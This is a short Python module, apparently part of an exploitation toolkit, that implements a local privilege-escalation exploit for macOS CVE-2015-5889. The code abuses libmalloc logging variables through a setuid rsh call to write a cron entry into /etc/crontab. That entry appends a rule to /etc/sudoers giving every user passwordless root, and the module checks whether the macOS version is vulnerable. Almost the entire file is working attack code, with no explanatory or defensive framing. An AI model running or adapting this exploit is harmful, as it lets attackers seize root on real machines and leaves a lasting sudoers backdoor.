"""crontab editing using libmalloc"""
import os
import time
from distutils.version import LooseVersion

__cve__ = "2015-5889"
__credits__ = "rebel"


def vulnerable(version):
    """checks vulnerability"""
    return version <= LooseVersion("10.11")


def run():
    """runs exploit"""
    size = os.stat("/etc/sudoers").st_size

    env = dict()
    env["MallocLogFile"] = "/etc/crontab"
    env["MallocStackLogging"] = "yes"
    env[
        "MallocStackLoggingDirectory"
    ] = 'a\n* * * * * root echo "ALL ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers\n\n\n\n\n'

    print("Trying /etc/crontab...")

    pid = os.fork()
    if pid == 0:
        os.close(1)
        os.close(2)
        os.execve("/usr/bin/rsh", ["rsh", "localhost"], env)

    time.sleep(1)

    try:
        crontab = open("/etc/crontab").read()
        if "NOPASSWD" not in crontab:
            return
    except IOError:
        return

    print("Done \nWaiting for /etc/sudoers to change (<60 seconds)...")

    while os.stat("/etc/sudoers").st_size == size:
        print(".")
        time.sleep(1)

    return True
